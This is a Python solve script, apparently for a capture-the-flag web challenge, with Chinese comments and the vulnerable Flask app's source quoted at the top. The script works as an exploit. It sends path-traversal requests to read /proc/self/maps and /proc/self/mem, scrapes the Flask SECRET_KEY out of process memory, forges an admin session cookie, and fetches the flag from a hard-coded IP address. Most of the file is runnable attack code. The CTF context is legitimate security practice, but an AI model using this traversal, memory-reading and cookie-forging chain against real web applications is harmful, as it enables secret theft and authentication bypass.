# python project, session forgery, web with pwn
# solving:
# 	1. python存储对象的位置在堆上
# 	2. app是flask对象，而secret key在app.config['SECRET_KEY']
# 	3. 读取/proc/self/mem得到进程的内存内容，进而获取SECRET_KEY
#   4. “/proc/self/mem”内容较多而且存在不可读写部分，直接读取会导致程序崩溃，
#   因此需要搭配/proc/self/mem 获取堆栈分布结合，maps的映射信息来确定读的偏移值

# source code:
"""
import os
import uuid
from flask import Flask, request, session, render_template, Markup
from cat import cat
flag = ""
app = Flask(
 __name__,
 static_url_path='/',
 static_folder='static'
)
# uuid形如123e4567-e89b-12d3-a456-426614174000
# 共有32位
app.config['SECRET_KEY'] = str(uuid.uuid4()).replace("-", "") + "*abcdefgh" #SECRET_KEY为uuid替换-为空后加上*abcdefgh。这里刻意的*abcdefgh是在提示我们secret key的格式
if os.path.isfile("/flag"):
 flag = cat("/flag")
 os.remove("/flag") #这里读取flag后删掉了flag，防止之前任意文件读取出非预期解
@app.route('/', methods=['GET'])
def index():
 detailtxt = os.listdir('./details/')
 cats_list = []
 for i in detailtxt:
 cats_list.append(i[:i.index('.')])

 return render_template("index.html", cats_list=cats_list, cat=cat)


@app.route('/info', methods=["GET", 'POST'])
def info():
 filename = "./details/" + request.args.get('file', "")
 start = request.args.get('start', "0")
 end = request.args.get('end', "0")
 name = request.args.get('file', "")[:request.args.get('file', "").index('.')]

 return render_template("detail.html", catname=name, info=cat(filename, start, end)) #cat是上面引用进来的函数


@app.route('/admin', methods=["GET"])
def admin_can_list_root():
 if session.get('admin') == 1: #session为admin就能得到flag，此处需要session伪造
 return flag
 else:
 session['admin'] = 0
 return "NoNoNo"


if __name__ == '__main__':
 app.run(host='0.0.0.0', debug=False, port=5637)
"""

import requests
import re
import ast, sys
from abc import ABC
from flask.sessions import SecureCookieSessionInterface

url = "http://61.147.171.105:52989/"

# 此程序只能运行于Python3以上
if sys.version_info[0] < 3:  # < 3.0
    raise Exception('Must be using at least Python 3')


# ----------------session 伪造,单独用也可以考虑这个库： https://github.com/noraj/flask-session-cookie-manager ----------------
class MockApp(object):
    def __init__(self, secret_key):
        self.secret_key = secret_key


class FSCM( ):
    def encode(secret_key, session_cookie_structure):
        # Encode a Flask session cookie
        try:
            app = MockApp(secret_key)

            session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))
            si = SecureCookieSessionInterface()
            s = si.get_signing_serializer(app)

            return s.dumps(session_cookie_structure)
        except Exception as e:
            return "[Encoding error] {}".format(e)
            raise e


# -------------------------------------------


# 由/proc/self/maps获取可读写的内存地址，再根据这些地址读取/proc/self /mem来获取secret key
s_key = ""
bypass = "../.."
# 请求file路由进行读取
map_list = requests.get(url + f"info?file={bypass}/proc/self/maps")
map_list = map_list.text.split("\\n")
for i in map_list:
    # 匹配指定格式的地址
    map_addr = re.match(r"([a-z0-9]+)-([a-z0-9]+) rw", i)
    if map_addr:
        start = int(map_addr.group(1), 16)
        end = int(map_addr.group(2), 16)
        print("Found rw addr:", start, "-", end)

        # 设置起始和结束位置并读取/proc/self/mem
        res = requests.get(f"{url}/info?file={bypass}/proc/self/mem&start={start}&end={end}")
        # 用到了之前特定的SECRET_KEY格式。如果发现*abcdefgh存在其中，说明成功泄露secretkey
        if "*abcdefgh" in res.text:
            # 正则匹配，本题secret key格式为32个小写字母或数字，再加上*abcdefgh
            secret_key = re.findall("[a-z0-9]{32}\*abcdefgh", res.text)
            if secret_key:
                print("Secret Key:", secret_key[0])
                s_key = secret_key[0]
                break

# 设置session中admin的值为1
data = '{"admin":1}'
# 伪造session
headers = {
    "Cookie": "session=" + FSCM.encode(s_key, data)
}
# 请求admin路由
try:
    flag = requests.get(url + "admin", headers=headers)
    print("Flag is", flag.text)
except:
    print("Something error")